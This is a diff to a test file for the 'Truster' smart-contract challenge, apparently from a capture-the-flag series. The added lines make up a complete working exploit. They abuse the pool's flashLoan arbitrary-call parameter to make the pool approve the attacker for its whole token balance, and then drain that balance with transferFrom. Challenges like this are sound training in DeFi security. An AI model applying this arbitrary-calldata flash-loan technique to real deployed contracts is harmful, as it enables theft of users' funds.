@@ -29,6 +29,16 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        let iface = new ethers.utils.Interface([
+          "function approve(address spender, uint256 amount)",
+        ]);
+        let bal = await this.token.balanceOf(this.pool.address);
+        let data = iface.encodeFunctionData("approve", [attacker.address, bal]);
+
+        await this.pool.flashLoan(0, attacker.address, this.token.address, data);
+
+        this.token = this.token.connect(attacker);
+        await this.token.transferFrom(this.pool.address, attacker.address, bal);
     });
 
     after(async function () {
@@ -43,4 +53,3 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 });
-
